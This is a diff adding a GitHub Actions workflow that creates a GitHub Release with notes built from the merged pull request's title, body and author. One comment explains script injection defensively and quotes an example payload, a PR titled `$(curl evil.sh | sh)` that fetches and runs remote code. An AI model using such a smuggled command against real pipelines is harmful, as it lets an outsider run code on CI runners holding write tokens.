@@ -1,0 +1,53 @@
+name: Publish release on PR merge
+
+# Fires once a PR targeting main is closed. The `if:` below is what actually
+# restricts this to *merged* PRs — `closed` also fires for PRs closed without
+# merging, and there's no dedicated "merged" event type.
+on:
+  pull_request:
+    types: [closed]
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    if: github.event.pull_request.merged == true
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout main
+        uses: actions/checkout@v4
+        with:
+          ref: main
+
+      - name: Compute release tag
+        id: tag
+        run: echo "tag=v$(date -u +%Y.%m.%d)-$(git rev-parse --short HEAD)" >> "$GITHUB_OUTPUT"
+
+      - name: Create GitHub Release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          RELEASE_TAG: ${{ steps.tag.outputs.tag }}
+          # PR title/body/author are untrusted input (a PR can come from anyone).
+          # Passing them as env vars — not interpolating them directly into the
+          # run: script — keeps them inert data instead of executable script text;
+          # inlining them via ${{ }} directly into the script would be a script
+          # injection hole (e.g. a PR titled `$(curl evil.sh | sh)`).
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          MERGE_COMMIT: ${{ github.event.pull_request.merge_commit_sha }}
+        run: |
+          NOTES="## ${PR_TITLE}
+
+          - PR: #${PR_NUMBER} by @${PR_AUTHOR}
+          - Commit: ${MERGE_COMMIT}
+
+          ${PR_BODY}"
+
+          gh release create "$RELEASE_TAG" \
+            --title "$RELEASE_TAG" \
+            --notes "$NOTES" \
+            --target main
